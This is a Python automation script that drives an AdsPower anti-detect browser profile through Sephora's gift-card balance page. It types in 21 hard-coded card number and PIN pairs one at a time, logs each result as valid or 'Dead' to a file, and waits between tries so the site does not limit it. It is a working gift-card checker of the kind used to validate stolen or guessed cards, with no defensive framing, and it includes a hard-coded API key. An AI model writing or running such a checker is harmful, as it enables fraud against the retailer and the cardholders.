
import requests

api_key = "b9523bc0ad360b14afd7b638636ad21d"  # Thay thế bằng API Key của bạn
profile_id = "jc45nr0"    # Thay thế bằng ID của Profile muốn sử dụng
response = requests.get("http://local.adspower.net:50325/api/v1/browser/start?user_id=" + profile_id)

# response = requests.get(f"https://api.adspower.net/api/v1/profile/start?api_key={api_key}&profile_id={profile_id}")
profile_data = response.json()

import asyncio
from pyppeteer import launch

async def open_adspower_profile(profile_data):
    browser = await launch({
        'headless': False,
        # 'args': [
        #     '--no-sandbox',
        #     '--disable-setuid-sandbox',
        #     # f"--user-agent={profile_data['user_agent']}",  # Thông tin từ Adspower
        #     # f"--proxy-server={profile_data['proxy']}",     # Thông tin Proxy từ Adspower
        #     # Các cấu hình khác nếu cần
        # ]
    })

    # pages = await browser.pages()
    # page = pages[0]
    page = await browser.newPage()
    await page.goto("https://www.sephora.com/beauty/giftcards?fbclid=IwAR0Hsmt_4rRsaTpvUFgCTtRrQqAsJ--XRYbRl-tz9JZ9Z2mwgItywdmkm1U")
    await asyncio.sleep(2)
    await page.click('#modal0Dialog > button > svg')
    await asyncio.sleep(1)
    data = [
   ("6300233450924428", "02436649"),
    ("6300231588391086", "59539145"),
    ("6300232822603795", "62282745"),
    ("6300232579494728", "51784859"),
    ("6300232434801728", "93554090"),
    ("6300231459614565", "01283754"),
    ("6300233105672946", "63271737"),
    ("6300231692913438", "79419171"),
    ("6300232408381408", "17353923"),
    ("6300231908632060", "18404971"),
    ("6300233422058844", "67148115"),
    ("6300232452479071", "95944219"),
    ("6300231264347913", "25157331"),
    ("6300232586155849", "58661531"),
    ("6300231675539019", "58194347"),
    ("6300231930462756", "31608993"),
    ("6300232133209573", "76570578"),
    ("6300231882345805", "55180931"),
    ("6300231847779701", "47066947"),
    ("6300233357865702", "44340459"),
    ("6300233458319149", "65989962")
]
    for i in range(32):
        x = data[i][0]
        y = data[i][1]
        await asyncio.sleep(1)
        
        await page.type('#gcCardNumber', x)
        await page.type('#gcPinNumber', y)

        await page.click('body > div:nth-child(3) > div > div > main > div > div > div:nth-child(11) > div > div.css-0 > div > div:nth-child(2) > div > div > div > form > button')
        await asyncio.sleep(2)
        
        data1 = await page.evaluate('document.querySelector("#gcCardNumber").value')
        await asyncio.sleep(0.5)
        try:
            data2 = await page.evaluate('document.querySelector("body > div:nth-child(3) > div > div > main > div > div > div:nth-child(11) > div > div.css-0 > div > div:nth-child(2) > div > div > div > p.css-1np3mgg.eanm77i0").innerText')
        except:
            data2 = 'Dead'
        with open('output.txt', 'a') as file:
            file.write(data1+'\t')
            file.write(data2)
                
            file.write('\n')
        await asyncio.sleep(1)

        await page.click('#gcCardNumber')
        for _ in range(len(x)):
            await page.keyboard.press('Backspace')
        await asyncio.sleep(1)

        await page.click('#gcPinNumber')
        for _ in range(len(y)):
            await page.keyboard.press('Backspace')
        await asyncio.sleep(90)
        
    input("Enter")

asyncio.get_event_loop().run_until_complete(open_adspower_profile(profile_data))
